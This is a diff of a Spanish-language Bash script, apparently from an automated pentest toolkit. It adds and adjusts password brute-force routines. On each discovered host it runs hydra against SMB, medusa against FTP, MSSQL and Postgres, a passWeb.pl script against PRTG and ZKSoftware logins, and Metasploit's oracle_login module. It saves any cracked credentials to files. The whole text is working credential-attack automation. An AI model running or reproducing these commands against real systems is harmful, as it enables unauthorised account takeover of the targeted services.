@@ -151,6 +151,33 @@ then
 	 fi	
 fi
 
+
+if [ -f .servicios/PRTG.txt ]
+then
+
+	echo -e "\n\t $OKBLUE Encontre PRTG activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+		then       	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
+		for line in $(cat .servicios/PRTG.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`
+			
+			echo -e "\n\t########### $ip #######"			
+			
+			passWeb.pl -t $ip -p 80 -m PRTG -u prtgadmin -f top.txt > logs/cracking/$ip-PRTG-password.txt
+			grep --color=never 'encontrado' logs/cracking/$ip-PRTG-password.txt | tee -a vulnerabilidades/$ip-PRTG-password.txt
+			
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
+
 if [ -f .servicios/web401.txt ]
 then
 
@@ -187,11 +214,11 @@ then
 		hostlive=`nmap -n -Pn -p 445 $ip`
 		if [[ ${hostlive} == *"open"*  ]];then 
 		
-			hydra -l administrador -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-			hydra -l administrator -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-			hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-			hydra -l sistemas -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
-			hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
+			hydra -l administrador -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l administrator -P top.txt -t 1 $ip smb >> logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l soporte -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l sistemas -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
+			hydra -l $entidad -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null		
 			egrep --color=never 'password:|login:' logs/cracking/$ip-windows.txt | tee -a vulnerabilidades/$ip-windows-password.txt
 			
 			#https://github.com/m4ll0k/SMBrute (shared)
@@ -218,8 +245,8 @@ then
 		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
 		for ip in $(cat .servicios/ZKSoftware.txt); do
 			echo -e "\n\t########### $ip #######"			
-			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > logs/cracking/$ip-80-password.txt
-			grep --color=never 'encontrado' logs/cracking/$ip-80-password.txt | tee -a vulnerabilidades/$ip-80-password.txt										
+			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > logs/cracking/$ip-80-passwordZKSoftware.txt
+			grep --color=never 'encontrado' logs/cracking/$ip-80-passwordZKSoftware.txt | tee -a vulnerabilidades/$ip-80-passwordZKSoftware.txt
 			echo ""			
 		done
 		insert_data
@@ -241,8 +268,10 @@ then
 		port=`echo $line | cut -f2 -d":"`
 			echo -e "\n\t########### $ip #######"			
 			
-			medusa -e n -u admin -P top.txt -h $ip -M ftp | tee -a  logs/cracking/$ip-ftp.txt
-			medusa -e n -u root -P top.txt -h $ip -M ftp | tee -a  logs/cracking/$ip-ftp.txt
+			medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
+			medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
+			medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
+			medusa -e n -u test -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
 			grep --color=never SUCCESS logs/cracking/$ip-ftp.txt > vulnerabilidades/$ip-ftp-password.txt
 			echo ""			
 		done
@@ -265,9 +294,9 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "\n\t########### $ip #######"							
-		medusa -e n -u sa -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
-		medusa -e n -u adm -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
-		medusa -e n -u $entidad -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
+		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/$ip-mssql.txt
+		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
+		medusa -e n -u $entidad -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
 		
 		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilidades/$ip-mssql-password.txt
 		
@@ -276,6 +305,32 @@ then
    fi # if bruteforce
 fi
 
+
+if [ -f .servicios/oracle.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios oracle activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
+	  if [ $bruteforce == 's' ]
+      then 
+		export SQLPATH=/opt/oracle/instantclient_18_3
+		export TNS_ADMIN=/opt/oracle/instantclient_18_3
+		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
+		export ORACLE_HOME=/opt/oracle/instantclient_18_3
+
+	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
+	 for line in $(cat .servicios/oracle.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo -e "\n\t########### $ip #######"							
+		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/$ip-oracle-password.txt 2>/dev/null		
+		egrep --color=never 'Found' logs/vulnerabilidades/$ip-oracle-password.txt | tee -a vulnerabilidades/$ip-oracle-password.txt
+		
+	 done	
+	 insert_data
+   fi # if bruteforce
+fi
 
 if [ -f .servicios/postgres.txt ]
 then
@@ -291,9 +346,9 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "\n\t########### $ip #######"							
-		medusa -e n -u postgres -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
-		medusa -e n -u pgsql -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
-		medusa -e n -u $entidad -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
+		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
+		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
+		medusa -e n -u $entidad -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
 		
 		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilidades/$ip-postgres-password.txt
 		
